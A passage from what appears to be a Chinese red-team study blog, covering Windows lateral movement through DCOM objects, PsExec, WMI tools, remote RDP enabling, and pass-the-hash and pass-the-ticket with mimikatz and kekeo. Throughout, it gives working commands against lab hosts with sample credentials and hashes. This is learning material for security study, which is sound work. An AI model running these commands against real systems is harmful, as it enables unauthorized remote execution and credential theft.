在远程系统中的使用"></a>2、DCOM 在远程系统中的使用</h2><p>COM 即组件对象模型 (Component Object Model，COM) ，是基于 Windows 平台的一套组件对象接口标准，由一组构造规范和组件对象库组成。</p><p>COM 是许多微软产品和技术如 Windows 媒体播放器和 Windows Server 的基础。</p><p>DCOM （分布式组件对象模型）是微软基于组件对象模型（COM）的一系列概念和程序接口，DCOM 是 COM（组件对象模型）的扩展。</p><p>它支持不同的两台机器上的组件间的通信，不论它们是运行在局域网、广域网、还是 Internet 上，利用这个接口，客户端程序对象能够向网络中另一台计算机上的服务器程序对象发送请求。</p><p>攻击者可使用 DCOM 进行横向移动，通过 DCOM 攻击者可在拥有适当权限的情况下通过 Office 应用程序以及包含不安全方法的其他 Windows 对象远程执行命令。</p><p>使用 DCOM 进行横向移动的优势之一在于，在远程主机上执行的进程将会是托管 COM 服务器端的软件。例如我们滥用 ShellBrowserWindow COM 对象，那么就会在远程主机的现有 explorer.exe 进程中执行。</p><p>对攻击者而言，这无疑能够增强隐蔽性，由于有大量程序都会向 DCOM 公开方法，因此防御者较难以监测所有程序。</p><h3 id="在本地通过-DCOM-执行命令"><a href="#在本地通过-DCOM-执行命令" class="headerlink" title="在本地通过 DCOM 执行命令"></a>在本地通过 DCOM 执行命令</h3><p>1、获取 DCOM 程序列表</p><p>Get-CimInstance 是 PowerShell 3.0 以上的版本自带的，因此只有 Windows Server 2012 及以上的操作系统才会自带 Get-CimInstance 命令</p><pre class="line-numbers language-none"><code class="language-none">Get-CimInstance Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Windows 7 和 Windows Server 2008 中可以使用 Get-WmiObject 替代 Get-CimInstance</p><pre class="line-numbers language-none"><code class="language-none">Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2、使用 DCOM 执行任意命令</p><p>在 DCOM 程序列表中有个 MMC Application Class（MMC20.Application），这个 COM 对象可以编程 MMC 管理单元操作的组件脚本。</p><p>在本地以管理员权限启动一个 PowerShell，并执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得COM对象的实例后，还可以执行如下命令枚举这个 COM 对象中的不同方法和属性</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView | Get-Member<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 MMC20.Application 中有个 ExecuteShellCommand 方法，我们可以拿它来执行命令，比如启动个计算器</p><pre class="line-numbers language-none"><code class="language-none">$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902171015.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>除了 MMC20.Application 还有 ShellWindows、ShellBrowserWindow、Excel.Application 以及 Outlook.Application 等等可以被我们利用。</p><h3 id="使用-DCOM-在远程主机上执行命令"><a href="#使用-DCOM-在远程主机上执行命令" class="headerlink" title="使用 DCOM 在远程主机上执行命令"></a>使用 DCOM 在远程主机上执行命令</h3><p>在使用该方法时，需要具备以下条件：</p><ul><li>具有本地管理员权限的 PowerShell</li><li>需要关闭目标系统的防火墙。</li><li>在远程主机上执行命令时，必须使用域管的 administrator 账户或者在目标主机上具有管理员权限的账户</li></ul><p>1、调用 MMC20.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;))$com.Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)或者[Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.7.7&quot;)).Document.ActiveView.ExecuteShellCommand(&#39;cmd.exe&#39;,$null,&quot;&#x2F;c calc.exe&quot;,&quot;Minimized&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175722.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>2、调用 ShellWindows 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com&#x3D;[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;))$com.item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)或者[Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#39;,&quot;192.168.7.7&quot;)).item().Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902175207.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>以上这两种方法均适用于Windows 7、Windows 10、Windows Server 2008、Windows Server 2016 的系统。</p><p>除了 MMC20.Application 和 ShellWindows，还有以下这几种 DCOM 对象可以被利用。</p><p>3、调用 Excel.Application 远程执行命令</p><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromprogID(&quot;Excel.Application&quot;,&quot;192.168.7.7&quot;))$com.DisplayAlerts &#x3D; $false$com.DDEInitiate(&quot;cmd.exe&quot;,&quot;&#x2F;c calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4、调用 ShellBrowserWindow 远程执行命令</p><blockquote><p>适用于 Windows 10 和 Windows Server 2012 R2 等版本的系统</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.7.7&quot;))$com.Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromCLSID(&quot;C08AFD90-F2A1-11D1-8455-00A0C91F3880&quot;,&quot;192.168.3.144&quot;)).Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>5、调用 Visio.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Visio</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;))$com.[0].Document.Application.shellExecute(&quot;calc.exe&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Visio.Application&quot;,&quot;192.168.7.7&quot;)).[0].Document.Application.shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>6、调用 Outlook.Application 远程执行命令</p><blockquote><p>前提是目标安装了 Outlook</p></blockquote><pre class="line-numbers language-none"><code class="language-none">$com &#x3D; [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;))$com.createObject(&quot;Shell.Application&quot;).shellExecute(&quot;192.168.7.7&quot;)或者[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;Outlook.Application&quot;,&quot;192.168.7.7&quot;)).createObject(&quot;Shell.Application&quot;).shellExecute(&quot;calc.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="dcomexec-py-脚本"><a href="#dcomexec-py-脚本" class="headerlink" title="dcomexec.py 脚本"></a>dcomexec.py 脚本</h3><p>Impacket 工具包里也提供了 DCOM 的利用脚本，该脚本可以提供一个类似于 wmiexec.py 脚本的半交互式 shell，不过使用的是 DCOM</p><p>dcomexec.py 脚本目前支持 MMC20.Application、ShellWindows 和 ShellBrowserWindow 对象。</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者只执行一条命令</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator:1qaz@WSX@192.168.7.7 ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只知道 hash 也可以用 hash 去连接</p><pre class="line-numbers language-none"><code class="language-none">python3 dcomexec.py teamssix.com&#x2F;administrator@192.168.7.7 -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210904110328.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考文章：</p><p><a href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a></p><p><a href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】22、PsExec 和 WMI 的使用</title>
      <link href="//210902-132326.html"/>
      <url>//210902-132326.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、PsExec"><a href="#1、PsExec" class="headerlink" title="1、PsExec"></a>1、PsExec</h2><h3 id="PsExec-exe"><a href="#PsExec-exe" class="headerlink" title="PsExec.exe"></a>PsExec.exe</h3><p>PsExec 在之前的文章里提到过一次，参见<a href="https://teamssix.com/210802-181052.html">https://teamssix.com/210802-181052.html</a>，今天来着重学习一下。</p><p>PsExec 是 PSTools 工具包里的一部分，其下载地址为：<a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>利用 PsExec 可以在远程计算机上执行命令，其基本原理是通过管道在远程目标主机上创建一个 psexec 服务，并在本地磁盘中生成一个名为 PSEXESVC 的二进制文件，然后通过 psexec 服务运行命令，运行结束后删除服务。</p><p>建立 ipc$ 连接</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administrator或者net use \\192.168.7.7 &#x2F;u:teamssix.com\administrator &quot;1qaz@WSX&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在已经建立 ipc$ 的情况下，执行以下命令就可以获得 system 权限</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe -accepteula \\192.168.7.7 -s cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-accepteula 第一次运行 PsExec 会弹出确认框，使用该参数就不会弹出确认框-s 以 System 权限运行远程进程，如果不用这个参数，就会获得一个对应用户权限的 shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902092309.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果没有建立 ipc$ 连接，也可以直接使用 PsExec 指定用户名密码进行连接</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-u 域\用户名-p 密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者执行以下命令直接回显命令结果</p><pre class="line-numbers language-none"><code class="language-none">PsExec.exe \\192.168.7.7 -u administrator -p 1qaz@WSX cmd.exe &#x2F;c &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在使用 PsExec 时需要注意以下几点：</p><ul><li>需要远程系统开启 admin$ 共享（默认是开启的）</li><li>因为 PsExec 连接的原理是基于 IPC 共享，因此目标需要开放 445 端口</li><li>在使用 IPC$ 连接目标系统后，不需要输入账户和密码。</li><li>在使用 PsExec 执行远程命令时，会在目标系统中创建一个 psexec 的服务，命令执行完后，psexec 服务将被自动删除。由于创建或删除服务时会产生大量的日志，因此蓝队在溯源时可以通过日志反推攻击流程。</li><li>使用 PsExec 可以直接获得 System 权限的交互式 Shell 的前提目标是 administrator 权限的 shell</li><li>在域环境测试时发现，非域用户无法利用内存中的票据使用 PsExec 功能，只能依靠账号和密码进行传递。</li></ul><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>MSF 中也有 PsExec 的利用模块，使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;psexecset rhost 192.168.7.7set smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、WMI"><a href="#2、WMI" class="headerlink" title="2、WMI"></a>2、WMI</h2><p>WMI 全称 Windows Management Instrumentation 即 Windows 管理工具，Windows 98 以后的操作系统都支持 WMI。</p><p>由于 Windows 默认不会将 WMI 的操作记录在日志里，同时现在越来越多的杀软将 PsExec 加入了黑名单，因此 WMI 比 PsExec 隐蔽性要更好一些。</p><h3 id="wmic-命令"><a href="#wmic-命令" class="headerlink" title="wmic 命令"></a>wmic 命令</h3><p>WMI 连接远程主机，并使用目标系统的 cmd.exe 执行命令，将执行结果保存在目标主机 C 盘的 ip.txt 文件中</p><blockquote><p>使用 WMIC 连接远程主机，需要目标主机开放 135 和 445 端口( 135 端⼝是 WMIC 默认的管理端⼝，wimcexec 使⽤445端⼝传回显)</p></blockquote><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;cmd.exe &#x2F;c ipconfig &gt; c:\ip.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后建立 IPC$ ，使用 type 读取执行结果</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratortype \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902112523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>也可以预先建立 ipc$ 连接，再使用 wmic</p><pre class="line-numbers language-none"><code class="language-none">net use \\192.168.7.7\ipc$ &quot;1qaz@WSX&quot; &#x2F;user:administratorwmic &#x2F;node:192.168.7.7 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;c:\ip.txt&quot;type \\192.168.7.7\C$\ip.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h3><p>在 impacket 工具包里有 wmiexec.py 脚本，可以用来直接获取 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py administrator:1qaz@WSX@192.168.7.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902113920.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>wmiexec.py 还支持通过哈希传递获得 shell</p><pre class="line-numbers language-none"><code class="language-none">python3 wmiexec.py -hashes LMHash:NTHash 域名&#x2F;用户名@目标IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></p><pre class="line-numbers language-none"><code class="language-none">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.7.7 administrator 1qaz@WSX<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902122716.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 vmiexec.vbs 执行单条命令</p><pre class="line-numbers language-none"><code class="language-none">cscript wmiexec.vbs &#x2F;cmd 192.168.7.7 administrator 1qaz@WSX &quot;ipconfig&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这只是个半交互式的 Shell，因此对于运行时间比较长的命令，比如 ping、systeminfo 等，需要加上 -wait 5000 或更长的时间。</p><p>在运行 nc 等不需要输出结果但需要一直运行的进程时，可以使用 -persist 参数，当命令加了 -persist 选项后，程序会在后台运行，不会有结果输出，而且会返回这个命令进程的 PID，方便结束进程，这样就可以运行 nc 或者木马程序了。</p><p>不过目前 vmiexec.vbs 已经被卡巴斯基、赛门铁克等杀软列入查杀名单了。</p><h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</p><p>在 Powershell 中运行以下命令</p><pre class="line-numbers language-none"><code class="language-none"># 导入 Invoke-WmiCommand.ps1 脚本Import-Module .\Invoke-WmiCommand.ps1# 指定目标系统用户名$User &#x3D; &quot;teamssix.com\administrator&quot; # 指定目标系统的密码$Password &#x3D; ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential$Cred &#x3D; New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 指定要执行的命令和目标 IP$Remote &#x3D; Invoke-WmiCommand -Payload &#123;ipconfig&#125; -Credential $Cred -ComputerName 192.168.7.7# 将执行结果输出到屏幕上$Remote.PayloadOutput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902130614.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序。</p><pre class="line-numbers language-none"><code class="language-none"># 指定目标系统用户名$User&#x3D;&quot;teamssix.com\administrator&quot;# 指定目标系统密码$Password&#x3D;ConvertTo-SecureString -String &quot;1qaz@WSX&quot; -AsPlainText -Force# 将账号和密码整合起来，以便导入 Credential中$Cred&#x3D;New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User,$Password# 在远程系统中运行 calc.exe 命令Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.7.7&quot; -Credential $Cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902131658.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>可以看到在 192.168.7.7 主机中已经有进程 ID 为 3276 的 calc.exe 被执行了。</p><h3 id="wmic-的其他命令"><a href="#wmic-的其他命令" class="headerlink" title="wmic 的其他命令"></a>wmic 的其他命令</h3><p>使用 wmic 远程开启目标的 RDP</p><pre class="line-numbers language-none"><code class="language-none"># 适于 Windows xp、server 2003wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX PATH win32_terminalservicesetting WHERE (__Class!&#x3D;&quot;&quot;) CALL SetAllowTSConnections 1# 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostnamewmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX RDTOGGLE WHERE ServerName&#x3D;&#39;dc&#39; call SetAllowTSConnections 1或者wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &#39;cmd.exe &#x2F;c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>判断 RDP 有没有开可以使用以下命令，如果返回 0 表示开启，返回 1 表示关闭。</p><pre class="line-numbers language-none"><code class="language-none">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210902135523.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 wmic 远程重启目标计算机</p><pre class="line-numbers language-none"><code class="language-none">wmic &#x2F;node:192.168.7.7 &#x2F;user:administrator &#x2F;password:1qaz@WSX process call create &quot;shutdown.exe -r -f -t 0&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p> 参考文章：</p><p> <a href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a></p><p> <a href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a></p><p> 更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【内网学习笔记】21、哈希传递与票据传递</title>
      <link href="//210901-160349.html"/>
      <url>//210901-160349.html</url>
      
        <content type="html"><![CDATA[<h2 id="1、哈希传递"><a href="#1、哈希传递" class="headerlink" title="1、哈希传递"></a>1、哈希传递</h2><p>哈希传递（Pass The Hash, PTH）顾名思义，就是利用哈希去登录内网中的其他机器，而不是通过明文密码登录的方式。</p><p>通过哈希传递，攻击者不需要花时间破解哈希值得到明文，在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，因此此时往往会使用工具将哈希值传递到其他计算机中进行登录验证。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>在目标主机上使用 mimikatz 获取 NTLM Hash</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在远程主机上以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901120511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>mimikatz 执行后，会弹出一个拥有对应 Hash 用户权限的 CMD 窗口。</p><h3 id="AES-256-密钥"><a href="#AES-256-密钥" class="headerlink" title="AES-256 密钥"></a>AES-256 密钥</h3><p>使用 mimikatz 抓取密钥</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::ekeys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在其他远程计算机中，以管理员权限打开 mimikatz</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;aes256:7358fb65149672d99b8c9f3dfd0dfeb486b78268e9c5250b23aefbd26f293c60<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要目标机器上安装 KB2871997 补丁，补丁下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42722">https://www.microsoft.com/en-us/download/details.aspx?id=42722</a></p><p>将该补丁安装后，就可以通过 AES256 密钥进行哈希传递了。</p><p>除了 AES256 外还有 AES128 等，不过平时基本都是使用 NTLM 哈希进行传递。</p><h2 id="2、票据传递"><a href="#2、票据传递" class="headerlink" title="2、票据传递"></a>2、票据传递</h2><p>票据传递（Pass The Ticket, PTT），是基于Kerberos认证的一种攻击方式，这里主要学习票据传递在 mimikatz 和 kekeo 两个工具里的使用。</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>使用 mimikatz 可以将内存中的票据进行导出。</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::tickets &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行该命令后，会在当前目录下生成多个服务的票据文件，例如 kirbi 等</p><p>使用以下命令可以清除内存中的票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将票据文件注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt &quot;[0;4beae]-2-0-40e00000-Administrator@krbtgt-TEAMSSIX.COM.kirbi&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在当前终端下退出 mimikatz ，然后就可以列出目标目录了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210901153402.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>票据传递除了用 mimikatz 还可以用 kekeo</p><h3 id="kekeo"><a href="#kekeo" class="headerlink" title="kekeo"></a>kekeo</h3><p>kekeo 需要使用域名、用户名、NTLM HASH 生成票据，然后再将票据导入，从而连接远程计算机。</p><pre class="line-numbers language-none"><code class="language-none">tgt::ask &#x2F;user:administrator &#x2F;domain:teamssix.com &#x2F;ntlm:161cff084477fe596a5db81874498a24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 